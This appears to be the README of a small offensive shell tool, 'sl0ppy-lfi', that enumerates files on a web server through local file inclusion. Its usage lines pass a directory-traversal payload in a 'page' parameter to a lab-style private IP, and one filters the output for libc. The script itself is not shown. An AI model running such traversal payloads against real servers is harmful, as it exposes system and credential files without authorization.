# sl0ppy-lfi
small lfi enum tool 


# Usage 
* enum all 
./sl0ppy-lfi.sh http://10.10.11.154/index.php?page=../../../../../../../../../../

* enum specific stuff like only libc
./sl0ppy-lfi.sh http://10.10.11.154/index.php?page=../../../../../../../../../../ | grep "libc"
